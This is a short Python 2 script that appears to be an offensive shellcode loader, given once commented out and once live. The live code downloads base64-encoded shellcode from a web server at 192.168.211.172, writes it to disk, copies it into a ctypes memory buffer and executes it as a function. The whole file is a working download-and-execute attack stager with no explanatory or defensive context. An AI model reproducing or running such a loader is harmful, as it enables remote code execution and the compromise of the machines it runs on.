# import ctypes
# import urllib2
# import base64
#
# # retrieve the shellcode from our web server
# url = "http://192.168.211.172:8000/shellcode.bin"
# response = urllib2.urlopen(url)
#
# # decode the shellcode from base64
# shellcode = base64.b64decode(response.read())
#
# # create a buffer in memory
# shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
#
# # create a function pointer to our shellcode
# shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
#
# # call our shellcode
# shellcode_func()

import ctypes
import urllib2
import base64

# retrieve the shellcode from our web server
url = "http://192.168.211.172:8000/shell.bin"
request = urllib2.Request(url)
response = urllib2.urlopen(request)

# decode the shellcode from base64
shellcode = base64.b64decode(response.read())

f = open("shell.bin","wb")
f.write(shellcode)

# create a buffer in memory
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# create a function pointer to our shellcode
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# call our shellcode
shellcode_func()


